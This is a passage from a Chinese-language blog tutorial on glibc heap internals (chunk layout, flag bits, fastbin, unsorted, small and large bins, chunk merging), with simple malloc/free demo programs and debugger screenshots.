src="/2020/12/15/%E5%A0%86/image-20201212004040135.png" alt="image-20201212004040135"></p><p>32位</p><p><img src="/2020/12/15/%E5%A0%86/image-20201212004126045.png" alt="image-20201212004126045"></p><blockquote><p><strong>当前chunk处于分配状态时：</strong></p><ul><li>fd：从fd字段开始的是用户的数据</li></ul><p><strong>当前chunk处于空闲时：</strong></p><p>因为chunk处于空闲时，会被放到bin链中，所以fd和bk用于指向自己所在bin链中前后的空闲chunk</p><ul><li>fd：指向前一个（非物理相邻）空闲的 chunk的指针（头指针）</li><li>bk：指向后一个（非物理相邻）空闲的 chunk的指针</li><li>通过fd和bk可以将空闲的chunk块加入到空闲的chunk块链表进行统一管理</li></ul><p><strong>fd_nextsize、bk_nextsize</strong></p><p>也是只有chunk空闲的时候才使用，不过其用于较大的chunk（large chunk）</p><ul><li>fd_nextsize：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含bin的头指针</li><li>bk_nextsize：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针</li></ul><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历</p></blockquote><h5 id="malloc-chunk的内存分配大小"><a href="#malloc-chunk的内存分配大小" class="headerlink" title="malloc_chunk的内存分配大小"></a>malloc_chunk的内存分配大小</h5><p><strong>最小的空间：</strong>mchunk_prev_size字段 + mchunk_size字段 + fd字段 + bk字段 所需要的空间。所以64位系统最低需要 4 * SIZE_SZ = 32字节；32位系统是16字节</p><p><strong>实际空间：</strong>malloc大小 + chunk对齐规则 + mchunk_prev_size字段 + mchunk_size字段 + 下一个chunk的mchunk_prev_size成员空间</p><p>chunk的数据结构大小的图（64位系统）</p><p><img src="/2020/12/15/%E5%A0%86/20201106174934849.jpg" alt="img"></p><h5 id="mchunk-size的标记位的复用"><a href="#mchunk-size的标记位的复用" class="headerlink" title="mchunk_size的标记位的复用"></a>mchunk_size的标记位的复用</h5><p>mchunk_size在64位系统下是8个字节，字段的最后三个bit位，复用用作了（AMP）的标记位置。后三位bit位的复用，不会影响size的数据大小</p><ul><li>A：A=0 为主分区分配，A=1 为非主分区分配，参见后面</li><li>M：M=1表示使用mmap映射区域，M=0为使用heap区域</li><li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效</li></ul><h3 id="0x04-chunk的分类"><a href="#0x04-chunk的分类" class="headerlink" title="0x04 chunk的分类"></a>0x04 chunk的分类</h3><h4 id="1-allocated-chunk"><a href="#1-allocated-chunk" class="headerlink" title="1.allocated chunk"></a>1.allocated chunk</h4><p>当前chunk是被应用层用户所使用的</p><h4 id="2-free-chunk"><a href="#2-free-chunk" class="headerlink" title="2.free chunk"></a>2.free chunk</h4><p>当前chunk是空闲的，没有被应用层用户所使用</p><h4 id="3-top-chunk"><a href="#3-top-chunk" class="headerlink" title="3.top chunk"></a>3.<strong>top chunk</strong></h4><ul><li><strong>概念：</strong>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk</li><li><strong>作用：</strong>该chunk并<strong>不属于任何</strong>bin，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用</li><li><strong>分配的规则：</strong>如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap</li></ul><h4 id="4-last-remainder-chunk"><a href="#4-last-remainder-chunk" class="headerlink" title="4.last remainder chunk"></a>4.last remainder chunk</h4><ul><li><strong>它是怎么产生的：</strong>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，<strong>再将该新的chunk变成新的last remainder chunk</strong></li><li><strong>它的作用是什么：</strong>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性</li></ul><h3 id="0x05-bins分类"><a href="#0x05-bins分类" class="headerlink" title="0x05 bins分类"></a>0x05 bins分类</h3><blockquote><ul><li>bin是一个由struct chunk结构体组成的链表</li><li>前面介绍过，不同的chunk根据特点不同分为不同的chunk，为了将这些chunk进行分类的管理，glibc采用了bin链这种方式管理不同的chunk</li><li>不同的bin链是由arena管理的</li><li>bin链中的chunk均为free chunk</li></ul></blockquote><h4 id="1-bin的malloc-state"><a href="#1-bin的malloc-state" class="headerlink" title="1.bin的malloc_state"></a>1.bin的malloc_state</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链</li><li><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2~63）、large bin链（64~126）</li></ul><h4 id="2-fastbin"><a href="#2-fastbin" class="headerlink" title="2.fastbin"></a>2.fastbin</h4><p><strong>概念：</strong>chunk的大小在32字节到128字节（0x20~0x80）的chunk称为“fast chunk（大小不是malloc时的大小，而是在内存中struct malloc_chunk的大小，包含前2个成员）</p><ul><li>fast bin链表的个数为10个</li><li><strong>不会对free chunk进行合并：</strong>鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于<strong>fast bin的chunk的PREV_INUSE位总是设置为1</strong>，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜</li><li>LIFO</li></ul><blockquote><h3 id="fastbinsY数组存储fastbins的规则："><a href="#fastbinsY数组存储fastbins的规则：" class="headerlink" title="fastbinsY数组存储fastbins的规则："></a>fastbinsY数组存储fastbins的规则：</h3><ul><li>每个fast bin链表都是单链表（使用fd指针）。因此，fast bin中无论是添加还是移除fast chunk，都是对“链表尾”进行操作，而不会对某个中间的fast chunk进行操作</li><li>单个fastbin链表中的chunk大小都是相同的，各个fastbin链表中的chunk大小是不同的</li></ul><p><img src="/2020/12/15/%E5%A0%86/2019072416485849.png" alt="img"></p></blockquote><h4 id="3-unsorted-bin"><a href="#3-unsorted-bin" class="headerlink" title="3.unsorted bin"></a>3.unsorted bin</h4><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。在堆管理器的unsorted bin 不为空时，<strong>用户申请非fast bin大小的内存</strong>会先从unsorted bin中查找，如果找到符合该申请大小要求的chunk，则直接分配或分割该chunk。</p><ul><li>unsorted bin的个数： 1个</li><li>unsorted bin是一个由free chunks组成的循环双链表</li><li>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中</li><li>unsortedbin采用的遍历顺序是FIFO</li></ul><p><img src="file://C:\Users\86138\Music\hexo\source\_posts\PWN学习\image-20201119163232880.png?lastModify=1607780072" alt="image-20201119163232880"></p><h4 id="4-small-bin"><a href="#4-small-bin" class="headerlink" title="4.small bin"></a>4.small bin</h4><p><strong>概念</strong>：小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的</p><ul><li>small bin链表的个数为62个</li><li>FIFO</li><li><strong>循环双向链表</strong>，就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢</li></ul><blockquote><p><strong>Small bin链表</strong></p><ul><li>每个smallbin也是一个由对应free chunk组成的循环双链表</li><li><strong>small bin采用FIFO(先入先出)算法：</strong>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk</li><li>单个smallbin链表中的chunk大小都是相同的，各个smallbin链表中的chunk大小是不同的，跟fastbinsY数组存储fastbin链的原理是相同的</li></ul><p><img src="/2020/12/15/%E5%A0%86/201907300808254.png" alt="img"></p></blockquote><h4 id="5-large-bin"><a href="#5-large-bin" class="headerlink" title="5.large bin"></a>5.large bin</h4><p><strong>概念：</strong>大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的</p><ul><li>large bin链表的个数为63个，被分为6组</li><li>largechunk使用fd_nextsize、bk_nextsize连接起来的</li></ul><blockquote><h3 id="Large-Bin链表"><a href="#Large-Bin链表" class="headerlink" title="Large Bin链表"></a>Large Bin链表</h3><ul><li>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中</li><li>large chunk可以添加、删除在large bin的任何一个位置</li><li><strong>在这63个largebins中：</strong>第一组的32个largebin链<strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。</strong>第二组的16个largebin链<strong>依次以512字节步长为间隔；</strong>第三组的8个largebin链<strong>以步长4096为间隔；</strong>第四组的4个largebin链<strong>以32768字节为间隔；</strong>第五组的2个largebin链<strong>以262144字节为间隔；</strong>最后一组**的largebin链中的chunk大小无限制</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190730154304263.png" alt="img"></p></blockquote><p><img src="/2020/12/15/%E5%A0%86/20190724174830502.png" alt="img"></p><h3 id="0x06-堆的调用流程"><a href="#0x06-堆的调用流程" class="headerlink" title="0x06 堆的调用流程"></a>0x06 堆的调用流程</h3><p><img src="/2020/12/15/%E5%A0%86/20190722153928310.png" alt="img"></p><ul><li><h4 id="当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多"><a href="#当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多" class="headerlink" title="当应用程序“第一次”使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多"></a>当应用程序<strong>“第一次”</strong>使用malloc函数申请动态内存时，glibc库会向内核申请一块非常大的动态内存，这块动态内存会比malloc申请的大小大很多</h4></li><li><p>glibc申请到这块大的内存之后，根据malloc需要的大小，然后切割相应的大小给应用程序malloc函数使用</p></li><li><p>当应用层free之后，会将刚才使用到的动态内存返回给glibc，但是返回的内存不是返回给top chunk，而是由bins链管理</p></li><li><p>当程序再次malloc时，会从刚才申请的很大的动态内存去取，不会再去向内核申请内存</p></li><li><p>只有当第一次申请的动态内存使用完时，glibc才会再次通过brk/mmap系统调用向内核去要内存</p></li></ul><h3 id="0x07-chunk的标志位"><a href="#0x07-chunk的标志位" class="headerlink" title="0x07 chunk的标志位"></a>0x07 chunk的标志位</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><ul><li><strong>NON_MAIN_ARENA：</strong>记录当前 chunk 是否不属于主线程</li><li><strong>IS_MAPPED：</strong>记录当前chunk是否是由mmap分配的</li><li><strong>PREV_INUSE：</strong>如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</li></ul><h4 id="2-实现"><a href="#2-实现" class="headerlink" title="2.实现"></a>2.实现</h4><ul><li><strong>在64位系统中为16字节对齐</strong>，<strong>在32位的系统中为8字节对齐</strong>。因此在64位系统中，struct malloc_chunk结构体的大小的最后4个位数是没有被使用的，32位系统中，最后3个位数是没有被使用的。</li></ul><p><img src="/2020/12/15/%E5%A0%86/2019072217303470.png" alt="img"></p><ul><li>所以，glibc用struct malloc_chunk结构体的fd成员的最后3个比特位来表示当前chunk处于什么状态。只需要将fd成员相应的比特位置为1，就可以代表当前chunk处于什么状态</li></ul><h4 id="3-PREV-INUSE位导致的chunk合并"><a href="#3-PREV-INUSE位导致的chunk合并" class="headerlink" title="3.PREV_INUSE位导致的chunk合并"></a>3.PREV_INUSE位导致的chunk合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = prev_size (p);                   <span class="comment">//1</span></span><br><span class="line">        <span class="built_in">size</span> += prevsize;                           <span class="comment">//2</span></span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//3</span></span><br><span class="line">        unlink(av, p, bck, fwd);                    <span class="comment">//4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先使用prev_inuse宏定义判断p的PREV_INUSE位是否为0</li><li>如果PREV_INUSE位为0，那么prev_inuse宏返回0，if条件为1，进入if语句体中</li><li>1.通过recv_size函数得到前面要合并的chunk的大小</li><li>2.将自己的大小与前面的presize相加得到合并后的chunk的大小</li><li>3.将p的指针向前移动，移动到前面那个chunk的开头处</li><li>4.unlink是将两个要合并的chunk各自从原来的bin链上面断下来，然后进行合并</li></ul><h4 id="4-fast-chunk的PREV-INUSE"><a href="#4-fast-chunk的PREV-INUSE" class="headerlink" title="4.fast chunk的PREV_INUSE"></a>4.fast chunk的PREV_INUSE</h4><ul><li>①无论fastchunk前面的chunk是否处于分配状态，PREV_INUSE始终为1。因为系统不希望fastchunk与前面的chunk之间进行合并</li><li>②不论当前的fastchunk是否处于分配状态，该chunk后面的chunk的PREV_INUSE位一定为1，也是为了防止后面的chunk与fastchunk合并</li></ul><h4 id="5-演示"><a href="#5-演示" class="headerlink" title="5.演示"></a>5.演示</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x70</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//为了达到演示效果，防止合并后的chunk与top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">    <span class="built_in">free</span>(p2);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到正好分配了3块</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183532647.png" alt="image-20201214183532647"></p><p>看一下内存地址</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183701946.png" alt="image-20201214183701946"></p><p>当我们释放一个之后</p><p>这里版本较高  淦 我先去找个虚拟机</p><p>可以看到是加到tcache中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214183930779.png" alt="image-20201214183930779"></p><hr><p>弄了一晚上 我又回来了</p><p>释放第一个</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214221400402.png" alt="image-20201214221400402"></p><p>释放两个</p><p><img src="/2020/12/15/%E5%A0%86/image-20201214221458119.png" alt="image-20201214221458119"></p><h3 id="0x08-chunk的mchunk-prev-size成员的空间复用"><a href="#0x08-chunk的mchunk-prev-size成员的空间复用" class="headerlink" title="0x08 chunk的mchunk_prev_size成员的空间复用"></a>0x08 chunk的mchunk_prev_size成员的空间复用</h3><h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h4><ul><li>①如果本chunk前面一个chunk处于空闲状态，那么mchunk_prev_size成员才有用，此时用来记录前一个chunk的大小</li><li>②如果本chunk前面一个chunk处于使用状态，那么mchunk_prev_size成员对于本chunk来说是不使用的</li></ul><h4 id="2-实现-1"><a href="#2-实现-1" class="headerlink" title="2.实现"></a>2.实现</h4><ul><li>当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的mchunk_prev_size中存储</li><li>否则，如果多出来的大小大于8字节，那么前一个chunk就不使用下一个chunk的mchunk_prev_size成员</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190724195005380.png" alt="img"></p><h4 id="3-演示"><a href="#3-演示" class="headerlink" title="3.演示"></a>3.演示</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x108</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0x108模0x10之后还有8 说明是占用了下一个chunk的pre_size</p><p>64位16字节对齐 0x100(分配)+0x10(头)+0x1(P)</p></blockquote><p><img src="/2020/12/15/%E5%A0%86/image-20201214190713309.png" alt="image-20201214190713309"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x109</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0x109模0x10为9 所以pre_size不够用 需要多申请1个单元</p><p>chunk被隐式对齐位0x110</p><p>64位16字节对齐 0x110+0x10+0x1</p></blockquote><p><img src="/2020/12/15/%E5%A0%86/image-20201214191149578.png" alt="image-20201214191149578"></p><h3 id="0x09-chunk的大小"><a href="#0x09-chunk的大小" class="headerlink" title="0x09 chunk的大小"></a>0x09 chunk的大小</h3><p>其实上一节我们就演示了 但这一节还是重点讲一下</p><h4 id="1-chunk的实际大小"><a href="#1-chunk的实际大小" class="headerlink" title="1.chunk的实际大小"></a>1.chunk的实际大小</h4><ul><li>当用户通过malloc函数申请堆内存时，可以使用的内存的起始地址是从fd成员开始的，所以用户无法访问结构体的前两个成员</li><li>当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员</li><li>例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间</li><li><strong>chunk的实际大小=malloc的大小+chunk的前两个成员+mchunk_prev_size成员的合并操作+chunk对齐规则</strong></li></ul><p>这个上面演示过了 就不演示了</p><h4 id="2-chunk的最低大小"><a href="#2-chunk的最低大小" class="headerlink" title="2.chunk的最低大小"></a>2.chunk的最低大小</h4><ul><li>malloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10）。（即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和）</li><li><strong>chunk的最低大小一定为0x20大小</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//int size=0x109;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/15/%E5%A0%86/image-20201214191901328.png" alt="image-20201214191901328"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201214191928725.png" alt="image-20201214191928725"></p><h3 id="0x10-bins的单向链表、双向链表存储结构"><a href="#0x10-bins的单向链表、双向链表存储结构" class="headerlink" title="0x10 bins的单向链表、双向链表存储结构"></a>0x10 bins的单向链表、双向链表存储结构</h3><h4 id="1-fastbins的单向链表存储结构"><a href="#1-fastbins的单向链表存储结构" class="headerlink" title="1.fastbins的单向链表存储结构"></a>1.fastbins的单向链表存储结构</h4><ul><li>fastbins是单向链表存储，fastbins中的的chunk是不会合并的（glibc规定这些chunk的PREV_INUSE位永远为1）</li></ul><blockquote><p><strong>存储结构：</strong></p><ul><li><strong>fastbins的存储采用后进先出（LIFO）的原则：</strong>后free的chunk会被添加到先free的chunk的后面；同理，通过malloc取出chunk时是先去取最新放进去的</li><li>因为是单链表，fastbins中的所有chunk的bk是没有用到的</li><li>并且fastbins比较特殊，一个fastbin链第一个chunk指向于一个特殊的“0”，然后后面接的是后free的chunk……以此类推，最后一个chunk再由arena的malloc_state的fastbinsY数组所管理</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201215160058074.png" alt="image-20201215160058074"></p></blockquote><p><strong>演示</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">int</span> size2=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了程序打断点，没有其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打到断点处 heap的信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160443811.png" alt="image-20201215160443811"></p><p>释放p1 p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160534048.png" alt="image-20201215160534048"></p><p>可以看到第一个被释放chunk的fd指针指向0 而第二个被释放chunk的fd指针指向第一个</p><p>看一下main_arena 可以看到是指向最后一个chunk 也就验证了上面的结论</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160746395.png" alt="image-20201215160746395"></p><p>接下来我们释放第三个</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161151487.png" alt="image-20201215161151487"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161023500.png" alt="image-20201215161023500"></p><p>由于与前两个大小不同所以我们会新开一个链表 说明main_arena的地址也不一样</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161240081.png" alt="image-20201215161240081"></p><p>此次演示也就完成了</p><p>32位可自行演示</p></blockquote><h4 id="2-unsortedbin的双向链表存储结构"><a href="#2-unsortedbin的双向链表存储结构" class="headerlink" 